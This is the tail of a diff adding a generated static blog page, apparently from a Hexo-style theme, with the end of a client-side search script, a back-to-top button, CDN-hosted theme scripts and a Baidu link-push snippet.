+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
